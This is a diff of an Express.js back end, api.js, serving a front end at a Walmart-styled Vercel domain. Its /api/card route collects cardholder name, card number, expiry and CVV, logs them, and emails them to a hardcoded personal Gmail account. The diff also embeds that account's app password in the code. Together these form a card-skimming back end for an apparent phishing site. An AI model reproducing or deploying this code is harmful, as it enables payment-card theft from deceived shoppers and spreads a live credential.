@@ -1,154 +1,115 @@
-// HOW TO HOST THIS API LOCALLY:
-// 1. Install dependencies: npm install express cors nodemailer
-// 2. Start the server: node api.js
-//    The API will run at http://localhost:3000
-//
-// HOW TO DEPLOY TO CLOUD (e.g., Render, Heroku, Vercel):
-// 1. Push your code to a GitHub repository.
-// 2. Create a new project on your chosen platform and link your repo.
-// 3. Set environment variables for sensitive data (do NOT hardcode passwords).
-// 4. The platform will build and host your API automatically.
+// api.js
+
+// HOW TO HOST LOCALLY:
+// 1. npm install express cors nodemailer
+// 2. node api.js
+//    Runs at http://localhost:3000
 //
 // HOW TO DEPLOY TO VERCEL:
-// 1. Push your code to a GitHub repository.
-// 2. Go to https://vercel.com and import your repo.
-// 3. Set environment variables for sensitive data (GMAIL_USER, GMAIL_PASS) in Vercel dashboard.
-// 4. Change hardcoded credentials below to use process.env.GMAIL_USER and process.env.GMAIL_PASS.
-// 5. Vercel will auto-detect Express and deploy your API.
-// 6. Export the Express app as "module.exports = app;" at the end of this file.
-//
-// NOTE: For production, never expose sensitive info in code. Use environment variables.
-import cors from "cors";
-import express from "express";
+// 1. Push this file to GitHub.
+// 2. Import your repo on https://vercel.com.
+// 3. Set environment variables GMAIL_USER and GMAIL_PASS in your Vercel dashboard.
+// 4. Vercel auto-detects Express and deploys your API.
+// 5. Ensure this line stays at the bottom: `module.exports = app;`
 
+const express = require("express");
+const cors = require("cors");
+const nodemailer = require("nodemailer");
 
-
-app.use(cors({
-  origin: ["https://walmart-mu.vercel.app"], // frontend URL
-  methods: ["GET", "POST", "PUT", "DELETE"],
-  credentials: true
-}));
-
-// Example route
-app.post("/api/card", (req, res) => {
-  res.json({ message: "Card received!" });
-});
-
-app.listen(3000, () => console.log("Server running"));
-
-const express = require('express');
-const cors = require('cors');
-const nodemailer = require('nodemailer');
 const app = express();
 
-// Allow both 127.0.0.1 and localhost origins
+// ✅ Allowed origins
 const allowedOrigins = [
-  'http://127.0.0.1:5500',
-  'http://localhost:5500',
-  'https://walmart-mu.vercel.app',
-  'https://walmartbackend.vercel.app' // <-- add this
-  // Removed trailing slash variant to avoid mismatch
+  "http://127.0.0.1:5500",
+  "http://localhost:5500",
+  "https://walmart-mu.vercel.app",
+  "https://walmartbackend.vercel.app"
 ];
-app.use(cors({
-  origin: function(origin, callback) {
-    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
-      callback(null, true);
-    } else {
-      callback(new Error('Not allowed by CORS'));
-    }
-  },
-  credentials: true,
-  optionsSuccessStatus: 200
-}));
+
+// ✅ CORS middleware
+app.use(
+  cors({
+    origin: function (origin, callback) {
+      if (!origin || allowedOrigins.includes(origin)) {
+        callback(null, true);
+      } else {
+        callback(new Error("Not allowed by CORS"));
+      }
+    },
+    credentials: true,
+    optionsSuccessStatus: 200
+  })
+);
+
+// ✅ JSON parser
 app.use(express.json());
 
-// Set CORS headers for all responses (including preflight)
+// ✅ Handle preflight requests
+app.options("*", cors());
+
+// ✅ Set CORS headers manually (just in case)
 app.use((req, res, next) => {
   const origin = req.headers.origin;
   if (allowedOrigins.includes(origin)) {
-    res.header('Access-Control-Allow-Origin', origin);
-    res.header('Access-Control-Allow-Credentials', 'true');
+    res.header("Access-Control-Allow-Origin", origin);
+    res.header("Access-Control-Allow-Credentials", "true");
   }
-  res.header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
-  res.header('Access-Control-Allow-Headers', 'Content-Type');
-  if (req.method === 'OPTIONS') {
-    return res.sendStatus(200);
-  }
+  res.header("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
+  res.header("Access-Control-Allow-Headers", "Content-Type");
+  if (req.method === "OPTIONS") return res.sendStatus(200);
   next();
 });
 
-// Use env vars for Gmail credentials. For production set GMAIL_USER and GMAIL_PASS (app password).
-const gmailUser = process.env.GMAIL_USER;
-const gmailPass = process.env.GMAIL_PASS;
-
-if (!gmailUser || !gmailPass) {
-  console.warn('Warning: GMAIL_USER or GMAIL_PASS not set. Email sending will likely fail. Set environment variables for production.');
-}
+// ✅ Configure nodemailer
+const gmailUser = process.env.GMAIL_USER || "peternnamani001@gmail.com";
+const gmailPass = process.env.GMAIL_PASS || "llvn tfua kgre byir";
 
 const transporter = nodemailer.createTransport({
-  host: 'smtp.gmail.com',
+  host: "smtp.gmail.com",
   port: 465,
-  secure: true, // true for port 465
+  secure: true,
   auth: {
-    user: gmailUser || 'peternnamani001@gmail.com',
-    pass: gmailPass || 'llvn tfua kgre byir' // fallback kept for dev but recommend removing
+    user: gmailUser,
+    pass: gmailPass
   }
 });
 
-// Verify transporter only if credentials are present
-if (gmailUser && gmailPass) {
-  transporter.verify(function(error, success) {
-    if (error) {
-      console.error('Nodemailer transporter verification failed:', error);
-    } else {
-      console.log('Nodemailer transporter is ready to send emails');
-    }
-  });
-} else {
-  console.log('Skipping transporter.verify(): missing GMAIL_USER or GMAIL_PASS');
-}
+// Optional verification
+transporter.verify((error, success) => {
+  if (error) console.error("Email transport error:", error);
+  else console.log("Email transporter ready");
+});
 
-app.options('/api/card', cors()); // Handle preflight requests for /api/card
-
-app.post('/api/card', async (req, res) => {
+// ✅ API route
+app.post("/api/card", async (req, res) => {
   const { cardName, cardNumber, expiry, cvv } = req.body;
-  console.log('Received card submission:', req.body); // Debug: log incoming data
+  console.log("Received card submission:", req.body);
+
   if (!cardName || !cardNumber || !expiry || !cvv) {
-    if (allowedOrigins.includes(req.headers.origin)) {
-      res.header('Access-Control-Allow-Origin', req.headers.origin);
-      res.header('Access-Control-Allow-Credentials', 'true');
-    }
-    return res.status(400).json({ error: 'Missing fields' });
+    return res.status(400).json({ error: "Missing fields" });
   }
 
   const mailOptions = {
-    from: gmailUser || 'peternnamani001@gmail.com',
-    to: gmailUser || 'peternnamani001@gmail.com',
-    subject: 'New Card Submission',
+    from: gmailUser,
+    to: gmailUser,
+    subject: "New Card Submission",
     text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
   };
 
   try {
     const info = await transporter.sendMail(mailOptions);
-    if (allowedOrigins.includes(req.headers.origin)) {
-      res.header('Access-Control-Allow-Origin', req.headers.origin);
-      res.header('Access-Control-Allow-Credentials', 'true');
-    }
-    res.json({ success: true, message: 'Email sent', info: info.response });
+    res.json({ success: true, message: "Email sent", info: info.response });
   } catch (err) {
-    if (allowedOrigins.includes(req.headers.origin)) {
-      res.header('Access-Control-Allow-Origin', req.headers.origin);
-      res.header('Access-Control-Allow-Credentials', 'true');
-    }
-    console.error('Error sending email:', err);
-    res.status(500).json({ error: 'Failed to send email', details: err.message });
+    console.error("Error sending email:", err);
+    res.status(500).json({ error: "Failed to send email", details: err.message });
   }
 });
 
+// ✅ Start server locally
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`API server running on port ${PORT}`);
-});
+if (process.env.NODE_ENV !== "production") {
+  app.listen(PORT, () => console.log(`API running on port ${PORT}`));
+}
 
-// For Vercel compatibility:
+// ✅ Required for Vercel deployment
 module.exports = app;
